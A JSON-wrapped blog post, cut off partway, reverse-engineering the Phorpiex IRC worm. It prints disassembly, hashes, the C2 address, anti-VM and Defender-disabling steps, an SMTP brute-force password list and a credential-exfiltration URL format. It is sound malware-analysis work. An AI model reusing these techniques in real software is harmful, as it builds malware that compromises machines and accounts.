{
    "id": "9c3be3af-25f0-4d54-b6aa-9dbe02421c51",
    "created_at": "2023-05-06T02:09:30.131128Z",
    "updated_at": "2025-03-27T02:16:01.091093Z",
    "deleted_at": null,
    "sha1_hash": "23959da0143456f9fc82fe92892b26b666a014c2",
    "title": "2016-02-21 - Phorpiex - An IRC worm",
    "authors": "",
    "file_creation_date": "2023-05-05T01:55:17Z",
    "file_modification_date": "2023-05-05T01:55:17Z",
    "file_size": 707543,
    "plain_text": "# Phorpiex - An IRC worm\n\n**bin.re/blog/phorpiex/**\n\nFull reversal for the fun of it\n\nPhorpiex is a worm controlled over IRC. It can be instructed to do mainly three things: (1)\ndownload and run other executables, including the possibility to update itself; (2) to bruteforce SMTP credentials by checking popular login/password combinations on a downloaded\nlist of servers; (3) to spread executables — be it Phorpiex or any other malware — by email.\n\nThe IRC worm Phorpiex does not seem to be very widespread at the moment, nor is it\nparticularly sophisticated. Nevertheless I still did a complete code analysis of a Phorpiex\nsample the past weekend, because it is very pleasant and fun to reverse engineer:\n\nPhorpiex is written very cleanly. Some parts are most likely written in assembler.\nThere is a nice Anti-VM technique to get past. After that, there are no anti-reversing or\nanti-debugging measures that lessen the pleasure of reversing.\n\n\n-----\n\nPhorpiex uses very few library calls. For example, the IRC and SMTP protocol are\npartially implemented with only using windows socket calls for networking.\n\nI reversed the following sample:\n\n**md5**\nc753d418655a2c4570dc421105e1bbf0\n\n**sha256**\n7fb1664da6247b7d37ffd2f8a5c8151ca5e93733732647804e383f670113088a\n\n**size**\n856'576 bytes\n\n**scan date**\n2016-02-09 11:03\n\n**analysis**\n[link](https://malwr.com/analysis/NDY3YzY3MWYyY2JlNGM0N2EyZjNhNjEyMTEyZTg5Y2I/)\n\nUnpacking, which is not covered in this blog post, lead to the following binary:\n\n**md5**\n2a6fab4cfce55c3815fc80607797afd0\n\n**sha256**\nb45c7ac7e1b7bbc32944c01be58d496b5e765a90bd4b1026855dd44cea28cd12\n\n**size**\n131'072 bytes\n\n**scan data**\n2016-02-11 13:00\n\n**analysis**\n[link](https://www.virustotal.com/en/file/b45c7ac7e1b7bbc32944c01be58d496b5e765a90bd4b1026855dd44cea28cd12/analysis/1455195636/)\n\nThis blog post is mostly an embellishment of my research log. I’m well aware that the post\nshould be better researched, organized and written; but then again I looked at Phorpiex for\nthe sake of reverse engineering, and do not think there is any need for more documentation\nin the first place.\n\n## Initialization\n\nThis section describes the steps Phorpiex takes before listening for commands.\n\n### Prerequisites\n\n**Mutex**\n\n\n-----\n\nPhorpiex checks for other concurrent instances with mutex w6. If the mutex already exists,\nthe malware exits.\n\n**Anti-VM**\n\nThe malware uses two anti-VM techniques. The first targets Virtual Box, VMware, QEMU and\npotentially other products. The second targets Sandboxie.\n\nTechnique 1: Storage Device Property Product ID\n\nThis anti-VM technique reads the product ID of the first storage device and checks if the ID\ncontains one of three blacklisted strings.\n\n1. Open a handle to the first physical disk using CreateFileA on \\\\.\\PhysicalDrive0\n```\n    011D1043 push  0        ; hTemplateFile\n\n    011D1045 push  0        ; dwFlagsAndAttributes\n\n    011D1047 push  3        ; dwCreationDisposition\n\n    011D1049 push  0        ; lpSecurityAttributes\n\n    011D104B push  3        ; dwShareMode\n\n    011D104D push  0        ; dwDesiredAccess\n\n    011D104F push  offset first_drive ; \"\\\\.\\\\PhysicalDrive0\"\n\n    011D1054 call  ds:CreateFileA\n\n    011D105A mov   [ebp+hDevice], eax\n\n```\n\n-----\n\n2. Send the control code 0x2D1400 (2954240) to the device. This IOCTL stands for\n```\n IOCTL_STORAGE_QUERY_PROPERTY and returns the properties of the storage device. The\n\n```\nproperties are returned in a STORAGE_DEVICE_DESCRIPTOR structure.\n```\n  011D108A mov   [ebp+storage_query_property_inbuffer], 0\n\n  011D1094 push  80h              \n\n  011D1099 push  0               \n\n  011D109B lea   ecx, [ebp+storage_query_property_out]\n\n  011D10A1 push  ecx              \n\n  011D10A2 call  memset\n\n  011D10A7 add   esp, 0Ch\n\n  011D10AA push  80h              \n\n  011D10AF push  0               \n\n  011D10B1 lea   edx, [ebp+product_id]\n\n  011D10B7 push  edx              \n\n  011D10B8 call  memset\n\n  011D10BD add   esp, 0Ch\n\n  011D10C0 push  0               \n\n  011D10C2 lea   eax, [ebp+BytesReturned]\n\n  011D10C8 push  eax              \n\n  011D10C9 push  80h              \n\n  011D10CE lea   ecx, [ebp+storage_query_property_out]\n\n  011D10D4 push  ecx              \n\n  011D10D5 push  0Ch              \n\n  011D10D7 lea   edx, [ebp+storage_query_property_inbuffer]\n\n  011D10DD push  edx              \n\n  011D10DE push  2D1400h            \n\n  011D10E3 mov   eax, [ebp+hDevice]\n\n  011D10E9 push  eax              \n\n  011D10EA call  ds:DeviceIoControl\n\n```\n\n-----\n\n3. Retrieve the device s product ID from the STORAGE_DEVICE_DESCRIPTOR:\n```\n    011D10F8 lea   ecx, [ebp+storage_query_property_out]\n\n    011D10FE mov   [ebp+storage_query_property_out_], ecx\n\n    011D1104 mov   edx, [ebp+storage_query_property_out_]\n\n    011D110A mov   eax, [edx+STORAGE_DEVICE_DESCRIPTOR.ProductIdOffset]\n\n    011D110D mov   [ebp+product_id_offset], eax\n\n    011D1113 mov   [ebp+index], 0\n\n    011D111D mov   ecx, [ebp+product_id_offset]\n\n    011D1123 mov   [ebp+product_id_offset_], ecx\n\n    011D1129 jmp   short loc_11D113A\n\n    011D112B\n\n    011D112B\n\n    011D112B loc_11D112B:              \n\n    011D112B mov   edx, [ebp+product_id_offset_]\n\n    011D1131 add   edx, 1\n\n    011D1134 mov   [ebp+product_id_offset_], edx\n\n    011D113A\n\n    011D113A loc_11D113A:              \n\n    011D113A mov   eax, [ebp+product_id_offset_]\n\n    011D1140 movsx  ecx, [ebp+eax+storage_query_property_out]\n\n    011D1148 test  ecx, ecx\n\n    011D114A jz   short loc_11D1177\n\n    011D114C mov   edx, [ebp+index]\n\n    011D1152 mov   eax, [ebp+product_id_offset_]\n\n    011D1158 mov   cl, [ebp+eax+storage_query_property_out]\n\n    011D115F mov   [ebp+edx+product_id], cl\n\n    011D1166 mov   edx, [ebp+index]\n\n    011D116C add   edx, 1\n\n    011D116F mov   [ebp+index], edx\n\n    011D1175 jmp   short loc_11D112B\n\n\n```\nOn VMware Workstation 12.0, this returned “VMware Virtual S” for me.\n\n4. Search the following three strings, case-insensitively, inside the device ID:\n\nqemu\nvirtual\nvmware\nSo VMware Virtual S would get flagged against virtual and vmware. The VM is\nbusted if at least one of the three strings matches.\n\nSandboxie\n\n[The second VM detection routine targets Sandboxie. Sandboxie is indentified by two DLLs:](http://www.sandboxie.com/)\n```\n   SbieDll.dll\n   SbieDllX.dll\n\n```\n\n-----\n\nIf any of those two can be loaded with GetModuleHandleA then Sandboxie is considered\nrunning:\n```\n.text:012461F9 push  offset sandboxie_dll2      ; \"SbieDllX.dll\"\n\n.text:012461FE call  ds:GetModuleHandleA\n\n.text:01246204 test  eax, eax\n\n.text:01246206 jz   short passed\n\n\n```\nQuitting\n\nIf either of the two VM detection routines triggers the malware quits. Before exiting, it first\ncreates a batch script in the temp folder whose name has ten random letters, e.g., on\nWindows 7:\n```\nC:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\<10 RND LETTERS>.bat\n\n\n```\nThe bat script tries to delete the malware executable in an infinite loop. The script deletes\nitself after the executable is gone:\n```\n:repeat\n\ndel <PATH_TO_EXE>\n\nif exist <PATH_TO_EXE> goto repeat\n\ndel <PATH_TO_THIS_BAT>\n\n\n### Persistence\n\n```\nIf the Mutex did not exist yet and the anti-VM did not trigger, then Phorpiex moves on to\nestablish persistence.\n\n**Zone Identifier**\n\nFirst the Zone Identifier is stripped if present (usually when downloading the file through\nbrowsers):\n```\n009E6255 lea   ecx, [ebp+this_path]\n\n009E625B push  ecx\n\n009E625C push  offset aSZone_identifi ; \"%s:Zone.Identifier\"\n\n009E6261 push  104h      ; Count\n\n009E6266 lea   edx, [ebp+zone_identifier_stream]\n\n009E626C push  edx       ; Dest\n\n009E626D call  _snprintf\n\n009E6272 add   esp, 10h\n\n009E6275 lea   eax, [ebp+zone_identifier_stream]\n\n009E627B push  eax       ; lpFileName\n\n009E627C call  ds:DeleteFileA ; delete the zone.identifier s\n\n\n```\n**Placement**\n\nThe malware settles in one of the following three directories, testing them one after another:\n\n\n-----\n\n```\n   %windir%\n   %userprofile%\n   %temp%\n\n```\nThe malware tries to create a hardcoded subdirectory in those environments, in my sample\n```\nM-50504503224255244048500220524542045. On Windows 7 with user priviliges, this should\n\n```\nfail for %windir%, and be successful for %userprofile%. The malware copies the executable\nto the subdirectory under a hard-coded name, for my sample winsvc.exe. For example:\n```\nC:\\Users\\<USERNAME>\\M-50504503224255244048500220524542045\\winsvc.exe\n\n\n```\nThe malware then checks if it was running from the destination path in the first place,\nmeaning it must have established persistence in a previous run. If that is the case, Phorpiex\nskips to its normal operation described in Section C&C Communication.\n\n**Autostart**\n\nThe malware path is stored under the value name Microsoft Windows Service at\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\. This will\n\n```\nlaunch the malware on reboot.\n```\n003D6534 lea   eax, [ebp+target_path]\n\n003D653A push  eax      \n\n003D653B push  1       \n\n003D653D push  0       \n\n003D653F push  offset Microsoft_Windows_Service\n\n003D6544 mov   ecx, [ebp+phkResult]\n\n003D654A push  ecx      \n\n003D654B call  ds:RegSetValueExA\n\n\n```\n**Hiding**\n\nThe malware hides both the executable and the parent directory by marking them a hidden\nand read-only system directory/file:\n```\n003D642A push  7        ; system | readonly | hidden\n\n003D642C lea   eax, [ebp+target_dir]\n\n003D6432 push  eax       ; lpFileName\n\n003D6433 call  ds:SetFileAttributesA\n\n003D6439 push  7        ; dwFileAttributes\n\n003D643B lea   ecx, [ebp+target_path]\n\n003D6441 push  ecx       ; lpFileName\n\n003D6442 call  ds:SetFileAttri\n\n\n### Circumventing Security\n\n```\nPhorpiex circumvents both Windows’s Firewall and Defender.\n\n**Windows Firewall**\n\n\n-----\n\nThe malware adds itself to the list of programs allowed through Windows’s firewall. This list is\nkept under the registry key:\n```\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\-->\n\nParameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List\n\n\n```\nPhorpiex adds the value <TARGET>:*:Enabled:Microsoft Windows Service to this key, for\nexample:\n```\nC:\\Users\\<USER>\\M-50504503224255244048500220524542045\\winsvc.exe:*:Enabled:Microsoft\nWindows Service\n\n\n```\n**Windows Defender**\n\nIf present, Phorpiex disables the Windows Defender service. The service is disabled by\nwriting the DWORD 4 (disabled) to this key\n```\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\WinDefend\\:\n003663E5 mov   dword ptr [ebp+pDisabled], 4\n\n...\n\n00366582 lea   ecx, [ebp+pDisabled]\n\n00366588 push  ecx              \n\n00366589 push  4               \n\n0036658B push  0               \n\n0036658D push  offset ValueName        \n\n00366592 mov   edx, [ebp+phkResult]\n\n00366598 push  edx              \n\n00366599 call  ds:RegSetValueExA\n\n\n```\n**Cleanup**\n\nAfter the malware established persistence, the executable is run from the new location. Then\nthe “self-destruct-bat” described in Section Quitting is called and the process exits.\n\n## C&C Communication\n\nThis section describes the C2 communication over IRC. The first section describes the main\nloop that handles connecting to the C2 server(s) as well as sending, receiving and parsing of\nmessages. The second section documents the client messages; the third section the server\nmessages. Server messages can contain tasks for the client to execute. The format of those\ntask commands and the triggered client action are described in Section Tasks.\n\n### Main Loop\n\nPhorpiex has a list of hard-coded C&C targets which it tries to contact, starting with the first\nentry in the list. After each failed C&C communication, Phorpiex sleeps three seconds and\nthen advances to the next target entry, restarting at with the first target once the list is\n\n\n-----\n\nexhausted. The number of failed rounds is counted, but never actually used.\n\nThe target hosts can be either an IP string (resolved by inet_addr) or a hostname (resolved\nby gethostbyname).\n\nThe reversed sample only contained one target:\n\nHost: “220.181.87.80”\nPort: 5050\n\nThe entire C&C communication runs over Windows Sockets 2.\n\n**ID String**\n\nThe malware uses fingerprinting of the operating system in combination with a random string\nto generate a “unique” session ID.\n\n\n-----\n\n```\n.text:009E60B5 push  offset username ; x\n\n.text:009E60BA call  get_id_string\n\n```\nThe routine get_id_string identifies the following os information:\n\n_Window Version: By calling GetVersionExA and parsing the resulting minor and major_\nversion numbers, Phorpiex maps the operating system to one of the following strings:\n“95”, “NT”, “98”, “ME”, “2K”, “XP”, “2K3”, “VS”, “W7”, “W8”, “W10”, “UNK”.\n\n_Country. The country is guessed from the abbreviated locale country name:_\n```\n    .text:009E7151 lea   edx, [ebp+locale_abbr_country]\n\n    .text:009E7157 push  edx       ; lpLCData\n\n    .text:009E7158 push  LOCALE_SABBREVCTRYNAME ; LCType\n\n    .text:009E715A push  LOCALE_SYSTEM_DEFAULT ; Locale\n\n    .text:009E715F call  ds:GetLocaleInfoA\n\n\n```\nThe country is to “XXX” should the call fail.\n\n_32bit or 64bit: By checking the program folder name for the presence of “(x86)\",_\nPhorpiex determines if the Windows Version is 32bit or 64bit.\n\n_Privileges: Check if running as admin (“A”) or user (“U”) using IsUserAnAdmin._\n\n_Random String: Finally, to pursuit uniqueness, a string of 7 random letters “a” to “z” is_\nbuilt.\n\nEach bit of information is preceded with the pipe symbol | and then concatenated to form the\nid string. For example:\n```\n|USA|W7|64|U|uggzrxq\n\n\n```\nThis string is used as the identifier in the ensuing IRC communications. The ID string is\nregenerated after each failed IRC communication, and also after receiving 433 messages\n(ERR_NICKNAMEINUSE).\n\n### Client Messages\n\nThe client sends only a few types of IRC messages, all of which are standard RFC 2812.\n```\nNICK and USER are used to initiate the C&C communication. PONG is sent to reply to a server’s\nPING messages that test the connection. JOIN is called to join channels, either provided by\n\n```\nthe server (using the “j” task, see Section j - Join Channel, or in the process of handling a\nparticular task. For example joining #smtp when distributing malware by email. Phorpiex also\nimplements the PRIVMSG message type, but the code is not reachable.\n\n**NICK**\n\n**format**\n\n\n-----\n\n```\nNICK <id>\n\n```\n**example**\n```\nNICK |USA|W7|64|U|hzaemsf\n\n```\n**description**\nset the nickname, i.e., the identifying name\n\n**USER**\n\n**format**\n```\nUSER <username> <hostname> <servername> <realname>\n\n```\n**example**\n```\nUSER x \"\" \"x\" :x\n\n```\n**description**\nPhorpiex sets the username, servername and realname to “x” for all clients\n\n**PRIVMSG**\n\n**format**\n```\nPRIVMSG <receiver> :<text>\n\n```\n**example**\n? |\n\n**description**\nPhorpiex has a routine to send private messages, but it is never called.\n\n**PONG**\n\n**format**\n```\nPONG <param>\n\n```\n**example**\n```\nPONG 422\n\n```\n**description**\nReply to PING messages from server. If PONG messages are not acknoledge by PING, then\nthe IRC server closes the connection.\n\n**JOIN**\n\n**format**\n```\nJOIN <channel> <key>\n\n```\n**example**\n```\nJOIN #mail (null)\n\n```\n**description**\n\n\n-----\n\nJoin a channel. The key is always hard-coded to 0, which gets formated as (null) in the\n```\nsprintf call.\n\n### Server Messages\n\n```\nThe client can handle five different server command messages, some of which contain\nfurther tasks described in Section Tasks.\n\n**(Any Message That Contains “001”)**\n\nThe first message type is the only one not matched against the IRC command but the raw\nmessage received. The client looks for the string “001” inside the raw message, regardless\nof whether it is the prefix, command, or parameter of the the IRC message. If the string is\nfound, it causes the client to join the “mail” channel, i.e., to send JOIN #mail (null).\n\n**format**\n_(any msg that contains 001)_\n\n**example**\n```\n:001 x.x 001\n\n```\n**description**\nOnly IRC message that is not parsed. Causes client to join the #mail channel\n\nIf the string “001” is not found, then the IRC message is tokenized with the space \" \"\nseparator for further processing.\n\n**PING**\n\nPhorpiex sends frequent PING message, matched by comparing the first token with string\n“PING”. If the client does not respond to these with an appropriate PONG in a timely fashion,\nthe connection is closed. The PING messages I observed do not follow RFC 2812; instead of\nhaving one or two server parameters, the PING message is followed by “422 MOTD”. 422 is\nthe numeric reply for ERR_NOMOTD (no “message of the day”) and does not make sense in\nthis context. Regardless, the client is required to send back PONG 422.\n\n**format**\n```\nPING <param> [<extrastuff>]\n\n```\n**example**\n```\nPING 422 MOTD\n\n```\n**description**\nClient required to send PONG <param>, e.g., PONG 422. No other PING messages than the\none in the example have been observed.\n\n**443**\n\n\n-----\n\nThe third message type is a regular 433 numeric response as defined in RFC1459, matched\nby comparing the second token with “433”. 433 indicates that a nickname is already in use,\nmeaning the string generated in Section ID String was not unique. Accordingly, the client\ngenerates a new id string and sends it with NICK <id>. I never saw such a message.\n\n**format**\n```\n:<prefix> 433 <target>\n\n```\n**example**\n```\n:x.x 433 8.8.8.8\n\n```\n**description**\nRegenerate the ID, then send it with NICK <id>, e.g., NICK |USA|W7|64|U|kxaiiab\n\n**PRIVMSG**\n\nThe final two messages, PRIVMSG and 332 are used to give actual commands to the client.\nThe messages are matched by comparing the second token to PRIVMSG and 322\nrespectively. Handling of the tasks is the same for both message types, and I’ll discuss that\nlater in Section Tasks. The way the message is parsed is slightly different. First, the PRIVMSG:\n\n**format**\n```\n:<servername>!<channel>@<host> PRIVMSG <nick> :<task>\n\n```\n**example**\n```\n:x.x!mail@x PRIVMSG USA|W7|64|U|yxpnaeg :.d u |108|99|111|(...)|106|\n\n```\n**description**\nExecute the <task>, see later Sections. The <host> is required to be “x”, and the <channel>\nmust be set, unless the <nick> is a channel name.\n\nThe <host> parameter needs to be set to “x”, otherwise the message is discarded. Also, if\nthe <nick> parameter is not a channel name, i.e., beginning with “#\", then the <channel>\nparameter needs to be present. Like for the following 332 message, the channel is read from\nthe parameters but never actually used.\n\n**322**\n\nThe final message type, 322, also send a task to the client, only in a different format. 322 is\nthe numeric code for RPL_TOPIC, the task being the “topic”.\n\n**format**\n```\n:<prefix> 332 <nick> <channel> :<task>\n\n```\n**example**\n```\n:x.x 332 |USA|W7|64|U|yxpnaeg #mail :.j #b\n\n```\n**description**\nExecute the <task>, see later Sections.\n\n\n-----\n\nThe <prefix> needs to be present, but not parsed. The <channel> needs to be present and\nstart with #, but as in the previous PRIVMSG-command is not used.\n\nThe server sends other messages than those of these five message types. For example\n```\n:002 x.x 002. All those messages are silently ignored.\n\n## Tasks\n\n```\nThe bot master gives commands to the client through the <task> parameter of the PRIVMSG\nand 322 message types. The <task> is trailing parameter, meaning it follows after “:” and is\nallowed to contain spaces. Phorpiex also tokenizes the <task> at the space character, with\ndifferent tasks requiring different number of tokens, i.e., number of arguments.\n\nThis Section presents all types of tasks, tasked by the required number of parameters. To not\nget in the way of the IRC terminology, I call the first token of the task the action, meaning the\ncommand that is supposed to be executed. Some actions have multiple versions, that are\nselected by the following parameter. All valid tasks need to start with a “.\". So in summary,\nthe format of a valid task is:\n```\n\".\"<action> {<param>}\n\n\n```\nLonger running tasks are executed as threads. Phorpiex keeps track of those task in an\narray of up to 256 elements. Each task entry consists of three members:\n\n1. A numeric task_id that identifies the running action.\n2. The thread handle for the task.\n3. Potentially a Windows Socket.\n\nIn the following I also put my guess what the short <action> codes could stand for.\n\n### bye - Quit\n\nThis task orders the client to run the self destruct bat (see Section quitting), run\nWSACleanup, then exit.\n\n**format**\n```\nbye\n\n```\n**nr of parameters**\n0\n\n**subtypes**\nnone\n\n**example**\n```\nbye\n\n```\n\n-----\n\n**description**\nExit\n\n**task id**\n_(does not run as a task)_\n\n### m.off - Stop all Mailing Tasks\n\nThis stops the tasks with id 2 and 3. These tasks are associated with mailing malicious\ncontent to further spread Phorpiex or any other malware, see Sections Mail Exe with Server\nList and Mail Exe without Server List. The tasks are stopped by terminating the associated\nthread with TerminateThread, closing potential corresponding Windows Sockets with\n```\nclosesocket, and setting the task id to NULL.\n\n```\n**format**\n```\nm.off\n\n```\n**nr of parameters**\n0\n\n**subtypes**\nnone\n\n**example**\n```\nm.off\n\n```\n**description**\nStop Sending Mails\n\n**task id**\n_(does not run as a task)_\n\n### b.off - Stop Brute Forcing\n\nThis stops the tasks with id 4. These tasks are associated with brute forcing logins to SMTP\naccounts, see Section b - Brute-Force SMTP Accounts.\n\n**format**\n```\nb.off\n\n```\n**nr of parameters**\n0\n\n**subtypes**\nnone\n\n**example**\n```\nb.off\n\n```\n**description**\n\n\n-----\n\nStop Brute Forcing SMTP Accounts\n\n**task id**\n_(does not run as a task)_\n\n### j - Join channel\n\nThis task orders the client to join the channel provided as the first and only parameter.\n\n**format**\n```\nj <channel>\n\n```\n**nr of parameters**\n1\n\n**subtypes**\nnone\n\n**example**\n```\nj #b\n\n```\n**description**\nJoin the <channel>\n\n**task id**\n_(does not run as a task)_\n\nThis was the first task the sample received in my sandbox, ordered to join the “b” channel.\n\n### b - Brute-Force SMTP Accounts\n\nThis is the first longer running task. It takes two parameters:\n\n**format**\n```\nb <enc_url> <nr_sets>\n\n```\n**nr of parameters**\n2\n\n**subtypes**\nnone\n\n**example**\n```\nb |108|99|111|(...)|106| 2000\n\n```\n**description**\nBrute-Force SMTP Logins\n\n**task id**\n4 (exclusive)\n\n\n-----\n\nThe first parameter is an encrypted url. The bytes are passed as decimals separated by |.\nThe decryption is a buggy RC4 implementation, presented in Section RC4 Implementation.\n\nThe second parameter is a decimal that determines how many different lists with SMTP\nserver there are. Phorpiex pick a list randomly.\n\nThe task performs the following steps:\n\n1. Count the number of tasks running with task id 4. If there is one running already, then\n\ndon’t do nothing. Otherwise create a new task with ID.\n2. Decrypt the <enc_url> according to Section RC4 Implementation.\n3. Append ok.php to the URL, e.g., _[http://example.com/ becomes](http://example.com/)_\n\n_[http://example.com/ok.php.](http://example.com/ok.php)_\n4. Sleep between 0 and 30 seconds, randomly determined.\n5. Pick a set uniformly at random, between 1 and <nr_sets>. Append the random number\n\nand .txt to the url, e.g., http://example.com/ok.php221.txt.\n6. Download the url to a random file %TEMP%\\<10_RANDOM_DIGITS>.jgp, e.g.,\n```\n   c:\\Users\\User\\AppData\\Local\\Temp\\8473628340.jpg. The downloaded content\n\n```\ncontains a list of SMTP servers.\n7. Run three threads with the steps detailed below. The three threads slightly differ in\n\nexecution; the differences are noted at the end.\n8. Repeat Steps 4-7 3000 times.\n\nThe three threads run similar steps. These are the Steps for the first thread:\n\n[1. Pick a line from the downloaded file uniformly at random with Reservoir Sampling. The](https://en.wikipedia.org/wiki/Reservoir_sampling)\n\nline contains a hostname or IP string.\n\n\n-----\n\n2. Connect to the hostname or IP on Port 25. The first two steps are shown in the\n\nfollowing graph view. The FPU instructions calculate the harmonic fractions for the\nreservoir sampling.\n\n3. If the connection fails on port 25, then the other common SMTP port 587 is attempted.\n\nIf that fails also, then the process exits.\n\n\n-----\n\n4. If a connection could be established on either port, then Phorpiex repeats the next\n\nsteps for all combinations of these 8 usernames: test, test1, test123, info, admin,\n_webmaster, postmaster, contact and these 20 password: 1234, 12345, 123456,_\n_1234567, 12345678, 123123, test, test1, test123, test1234, info, admin, admin1,_\n_Password1, password, 1q2w3e, 1q2w3e4r, q1w2e3r4, postmaster, admin._\n\nConnect to target again.\n\nLook at the response. If ESMTP send EHLO USER\\r\\n, else send HELO USER\\r\\n\n\nCheck the response being 250 ( “Requested mail action okay, completed”),\notherwise try next username/password combo.\n\nSend AUTH LOGIN. If no 334 response follows try next username/password\ncombo.\n\nSend base64 encoded username. If no 334 response follows try next\nusername/password combo.\n\nSend base64 encoded password. If no 235 (“Authentication succesful”) response\nfollows try next username/password combo.\n\nSend MAIL FROM: hi@zmail.ru\\r\\n. If no 250 response follows try next\nusername/password combo.\n\nSend RCPT TO: smtpcheck@Safe-mail.net\\r\\n. If no 250 response follows try\nnext username/password combo.\n\nSend DATA\\r\\n. If no 250 response follows try next username/password combo.\n\nSend this text:\n```\n      Subject: hi\\r\\n\n\n      From: hi@zmail.ru\\r\\n\n\n      To: smtpcheck@Safe-mail.net\\r\\n\n\n      \\r\\n.\\r\\n\n\n\n```\nIf that is also successful, then move on to Step 5.\n\n5. Form the string:\n```\n  smtp://<username>@<target>|<target>:<port>|<username>|<password>\"\n\n\n```\n6. Append this string to the download url, after ?s=, for example:\n```\n    http://example.com/ok.php221.txt?\n s=smtp://webmaster@example.com|example.com:25|webmaster|Password1\n\n```\n\n-----\n\n7. Use the User-Agent _Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101_\n\n_Firefox/22.0” to make a GET request to the url._\n\n8. Delete the downloaded file with the targets.\n\nThe second thread does the same as the first thread, except the username is set to the\ntarget hostname or IP, e.g., “example.com”. The third thread tries the 8 hard-coded\nusernames, but also appends @<target> to them. For example, webmaster@example.com.\n\n### d - Download Executable\n\n**format**\n```\nd <type> <enc_url>\n\n```\n**nr of parameters**\n2\n\n**subtypes**\n```\nx, u, p, a, <abbr_country>\n\n```\n**example**\n```\nd x |108|99|(...)|106|\n\n```\n**description**\nDownload and Run Executable\n\n**task id**\n1 (non exclusive)\n\nThe first parameter designates different subtypes of the task:\n```\n   x: Execute the downloaded content and keep running the program\n   u: Execute the donwloaded content. If the filename (without extension) is w6, quit. The\n\n```\ncommand can be used to update Phorpiex.\n```\n   a: First geolocate the infected client. Only if the country is in the list of all hard-coded\n\n```\ncountries, execute the malware.\n```\n   p: First geolocate the infected client. Only if the country is in a partial list of hard-coded\n\n```\ncountries, execute the malware.\n```\n   <abbr_country>: First geolocate the infected client. Only if the country matches\n   <abbr_country>, execute the malware.\n\n```\nThe second parameter is an encrypted url, using the same encryption as for order b. See\nSection RC4 Implementation.\n\n**x - Execute**\n\nThe task performs the following steps:\n\n\n-----\n\n1. Decipher the url in <enc_url>, see Section RC4 Implementation.\n2. Add a new taks with id 1. Phorpiex allows multiple tasks to run with id 1.\n3. Seed rand with tick count, then generate a random path <TEMP>/<10 random\n```\n   digits>.exe, e.g., C:\\Users\\User\\AppData\\Local\\Temp\\mmliexuvnw.exe\n\n```\n4. Sleep between 0 to 30 seconds, determined uniformly at random.\n5. Download the deciphered url to the random path, using InternetOpenA /\n```\n   InternetOpenUrlA / InternetReadFile with User-Agent Mozilla/5.0 (Windows NT\n   6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0. This Firefox release is from\n\n```\nJune 2013.\n6. If the download failed, then Phorpiex repeats step 3 and 4, and tries to download the\n\nfile with URLDownloadToFileA.\n7. If either download was successful, Phorpiex runs the executable and continues\n\nlistening for new orders.\n\n**u - Update**\n\nThis type performs the same steps as x. The only difference is that after deciphering the url,\nPhorpiex checks if filename in the url, stripped of the extension, matches w6. For example,\n```\nhttp://www.example.com/w6.jpg would match. If the filename matches, then Phorpiex quits\n\n```\nif it is able to download the file. If the file can’t be downloaded, or if the filename is not w6,\nthen update has the same effect as execute.\n\n**a - Match against all Country Codes**\n\nThe type a adds a geolocation check before downloading and executing a file.\n\n1. First, Phorpiex makes a GET request api.wipmania.com. This will return the public\n\nfacing IP and country of the infected Client:\n```\n    GET / HTTP/1.1\n\n    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0)\n\n    Gecko/20100101 Firefox/22.0\n\n    Host: api.wipmania.com\n\n    HTTP/1.1 200 OK\n\n    Server: nginx\n\n    Date: Wed, 10 Feb 2016 12:16:18 GMT\n\n    Content-Type: text/html\n\n    Content-Length: 19\n\n    Connection: keep-alive\n\n    Keep-Alive: timeout=20\n\n    46.165.210.17<br>DE\n\n\n```\n2. Phorpiex parses the result by searching >, and taking the string that follows. In the\n\nabove example, DE.\n\n\n-----\n\n3. Phorpiex compares the country code from api.wipmania.com with the following 37\n\ncountries: US, CA, GB, AU, ZA, VI, VG, VE, VC, TT, TC, SG, SC, QA, PR, NZ, NA, MT, MO, LU, LC,\n```\n   KY, KN, IS, IE, HK, GU, DK, CY, CH, BS, BM, BH, BB, AS, AN, AE\n\n```\n4. If the client’s country is not in the list — DE for example isn’t — then the order is\n\naborted, i.e., no file is downloaded. Otherwise, the steps as in execute are carried out.\n\n**p - Match against partial Country Codes**\n\nType p differs from a in that a smaller list of 5 countries are accepted: US, GB, AU, CA, NZ.\n\n**<abbr_country - Match against provided Country**\n\nFinally, if the type is neither of the above (x, u, a or p), then the first parameter to the order is\ntreated as a country code. Downloading and executing the file only happens if the public\nfacing IP of the infected client matches the provided country. For example, d DE\n```\n|108|99|... will download and run the file if api.wipmania.com returns the country code DE.\n\n### m.s - Mail Exe with Server List\n\n```\n**format**\n```\nm.s <enc_url> <nr_of_files>\n\n```\n**nr of parameters**\n2\n\n**subtypes**\nnone\n\n**example**\n```\nm.s |108|99|(...)|106| 302\n\n```\n**description**\nMail an Executable\n\n**task id**\n3 (exclusive)\n\nThis task takes two parameters: an encrypted url and an integer that determines if the url\nhosts a target list.\n\n1. Check if there is already a task with ID 3 running. Return if there is a task already.\n\n2. Decrypt the url, see Section RC4 Implementation.\n\n3. Resolve hotmail.com and try to create a TCP connection on port 25. If that fails, abort\n\nthe task.\n\n4. Join the SMTP channel by sending JOIN #SMTP (null).\n\n\n-----\n\n5. Convert the second parameter to an integer.\n\n6. Add a new task with ID 3.\n\n7. Connect to http://icanhazip.com:\n```\n   GET / HTTP/1.1\n\n   User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101\n  Firefox/22.0\n\n   Host: icanhazip.com\n\n   HTTP/1.1 200 OK\n\n   Server: nginx\n\n   Date: Fri, 12 Feb 2016 10:35:54 GMT\n\n   Content-Type: text/plain; charset=UTF-8\n\n   Content-Length: 15\n\n   Connection: close\n\n   X-RTFM: Learn about this site at http://bit.ly/icanhazip-faq and don't abuse\n  the service\n\n   X-BECOME-A-RACKER: If you're reading this, apply here: http://rackertalent.com/\n   Access-Control-Allow-Origin: *\n\n   Access-Control-Allow-Methods: GET\n\n   8.45.32.37.\n\n\n```\nGet the IP address from the response. IF that fails, use “[0.0.0.0]\", otherwise make an\naddress to name translation with getnameinfo, for example 8.45.32.37.example.com\n\n8. Create a random file <TEMP>/<10 random letters>.jpg, 